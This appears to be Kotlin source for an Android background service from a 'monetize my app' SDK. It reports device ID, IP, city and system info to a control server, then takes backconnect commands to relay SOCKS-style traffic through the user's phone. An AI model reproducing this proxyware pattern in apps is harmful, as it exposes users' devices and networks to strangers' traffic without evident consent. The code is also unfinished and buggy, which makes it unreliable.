package net.monetizemyapp.android

import android.app.Service
import android.content.Intent
import android.os.IBinder
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import net.monetizemyapp.di.InjectorUtils
import net.monetizemyapp.network.*
import net.monetizemyapp.network.model.base.ServerMessageEmpty
import net.monetizemyapp.network.model.response.IpApiResponse
import net.monetizemyapp.network.model.step0.Ping
import net.monetizemyapp.network.model.step0.Pong
import net.monetizemyapp.network.model.step1.Hello
import net.monetizemyapp.network.model.step1.HelloBody
import net.monetizemyapp.network.model.step2.Backconnect
import net.monetizemyapp.network.model.step2.Connect
import net.monetizemyapp.network.model.step2.ConnectBody
import net.monetizemyapp.network.socks.SocksServer
import net.monetizemyapp.toolbox.CoroutineContextPool
import net.monetizemyapp.toolbox.extentions.*
import retrofit2.HttpException
import retrofit2.Response
import java.io.FileNotFoundException
import java.io.IOException
import java.net.InetSocketAddress
import java.net.URL
import java.net.URLConnection
import java.nio.ByteBuffer
import kotlin.coroutines.CoroutineContext
import kotlin.experimental.and
import kotlin.experimental.or


// TODO: If no message is received for last 10 minutes, client should assume connection is dead and reconnect.
@ExperimentalStdlibApi
class ProxyService : Service(), CoroutineScope {
    private val lifecycleJob = Job()
    override val coroutineContext: CoroutineContext
        get() = CoroutineContextPool.network + lifecycleJob

    companion object {
        private val TAG: String = ProxyService::class.java.canonicalName ?: ProxyService::class.java.name
    }

    private val serverConnections = mutableListOf<TcpClient>()


    private val locationApi by lazy { InjectorUtils.Api.provideLocationApi() }

    private val mainTcpClient: TcpClient by lazy {
        InjectorUtils.TcpClient.provideServerTcpClient()
            .apply {
                listener = object : TcpClient.OnSocketResponseSimpleListener() {
                    override fun onNewMessage(client: TcpClient, message: String) {
                        logd(TAG, "mainTcpClient onNewMessage, message : $message")
                        val response = message.toObject()
                        logd(TAG, "mainTcpClient onNewMessage, response : $response")
                        when (response) {
                            is ServerMessageEmpty -> {
                                //logd(TAG, "response message is empty")
                            }
                            is Ping -> {
                                logd(TAG, "mainTcpClient response message is Ping")
                                client.sendMessage(Pong().toJson())
                            }
                            is Backconnect -> {
                                startNewBackconnectSession(response)
                                logd(TAG, "mainTcpClient response message is Backconnect")
                            }
                        }
                    }

                    override fun onError(client: TcpClient, error: String) {
                        loge(TAG, "mainTcpClient onError : $error")
                    }
                }
            }
    }


    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {

        startProxy()

        return START_STICKY
    }

    private fun startProxy() {

        logd(TAG, "StartProxy")

        val clientKey = getAppInfo()?.metaData?.getString("monetize_app_key")

        if (clientKey.isNullOrBlank()) {
            throw IllegalArgumentException("Error: \"monetize_app_key\" is null. Provide \"monetize_app_key\" in Manifest to enable SDK")
        }

        launch {

            val location: Response<IpApiResponse>? = try {
                locationApi.getLocation()
            } catch (ex: HttpException) {
                loge(TAG, "Location request error : ${ex.message}")
                null
            } catch (ex: IOException) {
                loge(TAG, "Location request error : ${ex.message}")
                null
            }

            location?.takeIf { it.isSuccessful }?.body()?.let {
                val message = Hello(
                    HelloBody(
                        clientKey,
                        it.query,
                        deviceId,
                        it.city,
                        "TEST",//it.countryCode,
                        getSystemInfo()
                    )
                )
                mainTcpClient.sendMessage(message.toJson())
            }
        }
    }

    private fun startNewBackconnectSession(backconnect: Backconnect) {
        val newConnectionTcpClient = InjectorUtils.TcpClient.provideServerTcpClient().apply {
            listenToUpdates = false
        }

        launch {
            serverConnections.add(newConnectionTcpClient)
            val message = Connect(ConnectBody(backconnect.body.token))
            newConnectionTcpClient.sendMessageSync(message.toJson())

            logd(TAG, "sendMessageSync: message = ${message.toJson()}")
            val firstBytesResponse = newConnectionTcpClient.waitForBytesSync()
            logd(TAG, "waitForBytesSync: firstBytesResponse = ${firstBytesResponse.contentToString()}")

            newConnectionTcpClient.sendBytesSync(byteArrayOf(5, 0))
            logd(TAG, "sendBytesSync: bytes = ${byteArrayOf(5, 0).contentToString()}")
            val requestBytes = newConnectionTcpClient.waitForBytesSync()
            logd(TAG, "waitForBytesSync: requestBytes = ${requestBytes.contentToString()}")
            logd(TAG, "waitForBytesSync: requestBytes = ${requestBytes.decodeToString()}")

            /*// Parse IP that backconnect is asking us to connect to
            val ipBytes = requestBytes.copyOfRange(4, 8)
            val ip = ByteBuffer.wrap(ipBytes).int.toIP()
            val portByte = requestBytes[9]
            val port = portByte.toInt()
            logd(TAG, "New backconnect credentials: ip = $ip, port = $port\n")
            // todo connect to backconnect device and exchange messages*/

            val (ip, port) = parseSocksConnectionRequest(requestBytes)

            // Return bytes, or error, to the client
            val status = if (requestBytes.isEmpty()) 5 else 0

            val response = byteArrayOf(5, status.toByte(), 0, 0, 0, 0, 0, 0, 0)
            logd(TAG, "sendBytesSync : response = ${response.contentToString()} ")
            newConnectionTcpClient.sendBytesSync(response)

            val responseAfterStatus = newConnectionTcpClient.waitForBytesSync()
            logd(TAG, "waitForBytesSync: responseAfterStatus = ${responseAfterStatus.contentToString()} ")
            logd(TAG, "waitForBytesSync: responseAfterStatus = ${responseAfterStatus.decodeToString()} ")

            val address = InetSocketAddress(ip, port)
            val backConnectSocket = createSocketExternal(address)
            val backConnectTcpClient = BackConnectTcpClient(backConnectSocket).apply {
                listenToUpdates = false
            }

            exchangeBytes(newConnectionTcpClient, backConnectTcpClient)

        }
    }

    private fun parseSocksConnectionRequest(bytes: ByteArray): Pair<String, Int> {
        logd(TAG, "parseSocksConnectionRequest\n")
        bytes.forEachIndexed { index, byte ->
            logd(
                TAG,
                "Field${index + 1} (${
                SocksServer.CONNECTION_FIELDS[index]?.get(SocksServer.FIELD_NAME_BYTE)
                }) is ${
                SocksServer.CONNECTION_FIELDS[index]?.get(byte)}\n"
            )
        }

        val ipAddress: String = when {
            bytes[SocksServer.CONNECTION_FIELD_ADDRESS_TYPE] == SocksServer.ADDRESS_TYPE_IPv4 ->
                ByteBuffer.wrap(bytes.copyOfRange(4, 8)).int.toIP()
            bytes[SocksServer.CONNECTION_FIELD_ADDRESS_TYPE] == SocksServer.ADDRESS_TYPE_IPv6 ->
                bytes.copyOfRange(4, 20).contentToString()
            else -> {
                val length = bytes.get(SocksServer.CONNECTION_FIELD_ADDRESS_TYPE + 1)
                bytes.copyOfRange(4, length.toInt()).contentToString()
            }
        }
        logd(TAG, "Request IP Address = $ipAddress\n")
        val portBytes = bytes.takeLast(2).toByteArray()
        val port = ((portBytes[0] and 0xff.toByte()) shl 8 or (portBytes[1] and 0xff.toByte())).toInt()
        logd(TAG, "Request Port = $port\n")
        return Pair(ipAddress, port.takeIf { port > 0 } ?: 80)

    }

    private fun exchangeBytes(newConnectionClient: TcpClient, backConnectClient: TcpClient) {
        launch {
            while (true) {
                val backConnectRequestBytes = try {
                    backConnectClient.waitForBytesSync()
                } catch (e: FileNotFoundException) {
                    ByteArray(0)
                }
                if (backConnectRequestBytes.isEmpty()) {
                    continue
                }
                logd(TAG, "exchangeBytes : backConnectRequestBytes = ${backConnectRequestBytes.decodeToString()} ")

                newConnectionClient.sendBytesSync((backConnectRequestBytes.decodeToString() + endOfString()).toByteArray())
                val socketBytes = newConnectionClient.waitForBytesSync()
                logd(TAG, "exchangeBytes : socketBytes = ${socketBytes.contentToString()} ")
                logd(TAG, "exchangeBytes : socketBytes (decoded) = ${socketBytes.decodeToString()} ")
                //backConnectClient.sendBytesSync(socketBytes)
            }
        }
    }

    /**
     * Connects to external server.
     * These bytes will be funneled to backconnect server
     */
    private fun createSocketExternal(address: InetSocketAddress): URLConnection {
        return URL("http://${address.hostName}:${address.port}").openConnection()
            .apply {
                connect()
            }
    }


/*private fun createSocketExternal(address: InetSocketAddress): Socket {
    val proxyAddress = InetSocketAddress(proxyHost, proxyPort)
    return Socket(Proxy(Proxy.Type.SOCKS), address)
}*/


    override fun onDestroy() {
        //sockets.forEach { it.close() }
        serverConnections.forEach {
            it.stop()
        }
        mainTcpClient.stop()
        lifecycleJob.cancel()
    }
}